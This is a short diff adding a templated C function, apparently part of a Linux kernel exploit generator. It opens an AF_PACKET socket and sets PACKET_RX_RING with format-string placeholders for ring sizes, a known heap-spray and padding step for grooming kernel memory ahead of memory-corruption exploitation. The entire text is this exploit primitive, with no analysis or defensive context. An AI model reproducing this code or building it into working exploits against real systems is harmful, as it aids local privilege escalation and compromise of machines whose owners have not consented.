@@ -1,0 +1,23 @@
+void do_pgv_padding() {
+    unsigned int block_size = %d;
+    unsigned int block_nr = %d;
+    unsigned int frame_size = 2048;
+    int t = syscall(__NR_socket, 0x11, 3, htobe16(3));
+    if (t < 0) {
+    	fail("[-] socket(AF_PACKET)");
+    }
+    uint8 content[28];
+    uint64 address = (uint64)&content;
+    *(uint32*)(address) = block_size;
+    *(uint32*)(address+4) = block_nr;
+    *(uint32*)(address+8) = 0x800;
+    *(uint32*)(address+12) = block_size * block_nr / 0x800;
+    *(uint32*)(address+16) = 0x64;
+    *(uint32*)(address+20) = 0;
+    *(uint32*)(address+24) = 0;
+    int rv = syscall(__NR_setsockopt, t, 0x107, 5, address, 0x1c);
+    if (rv < 0) {
+    	fail("[-] setsockopt(PACKET_RX_RING)");
+    }
+}
+
